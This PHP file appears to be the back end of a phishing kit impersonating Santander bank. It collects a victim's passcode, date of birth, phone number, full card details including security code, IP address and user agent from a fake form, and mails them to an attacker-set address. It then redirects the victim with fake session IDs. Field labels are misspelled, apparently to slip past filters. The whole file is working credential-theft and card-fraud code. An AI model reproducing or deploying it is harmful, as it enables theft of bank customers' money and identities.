<?php
if($_POST["name"] != "" and $_POST["db"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------San.tan'der Info-----------------------\n";
$message .= "Passcode            	: ".$_POST['name']."\n";
$message .= "DOB            		: ".$_POST['db']."\n";
$message .= "Mobile Number          : ".$_POST['ph']."\n";
$message .= "C@rd Number            : ".$_POST['cn']."\n";
$message .= "Start Date       		: ".$_POST['st']."\n";
$message .= "Expiry Date            : ".$_POST['ex']."\n";
$message .= "Secur!ty C0de     		: ".$_POST['sc']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Cl!ent |P: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Us3r Ag3nt : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf3.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>